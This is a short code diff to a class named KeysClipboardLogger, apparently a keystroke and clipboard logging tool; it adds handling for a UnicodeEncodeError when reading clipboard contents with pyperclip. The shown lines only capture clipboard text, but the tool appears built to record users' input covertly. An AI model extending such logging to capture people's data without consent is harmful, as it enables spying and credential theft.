@@ -48,6 +48,8 @@ class KeysClipboardLogger:
             text = pc.paste()
         except pc.PyperclipException:
             text = None
+        except UnicodeEncodeError:
+            text = None
 
         if text is None:
             data = "Clipboard contained non-string item."
